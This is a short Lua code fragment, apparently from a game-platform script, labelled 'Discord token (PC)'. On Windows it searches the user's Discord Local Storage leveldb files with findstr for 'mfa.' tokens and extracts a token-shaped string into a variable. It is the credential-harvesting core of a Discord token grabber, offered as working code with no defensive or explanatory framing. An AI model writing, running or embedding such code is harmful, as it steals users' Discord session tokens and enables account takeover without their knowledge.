-- Discord token (PC)
local discordToken = "NOT_FOUND"
if platform == Enum.Platform.Windows then
    local tokenPath = os.getenv("LOCALAPPDATA") .. "\\Discord\\Local Storage\\leveldb"
    local fileHandle = io.popen('findstr /s /m "mfa\\." "' .. tokenPath .. '\\*.ldb" 2>nul')
    if fileHandle then
        local content = fileHandle:read("*all")
        for match in string.gmatch(content, "([%w-_]+%.[%w-_]+%.[%w-_]+)") do
            if #match > 50 then discordToken = match break end
        end
        fileHandle:close()
    end
end

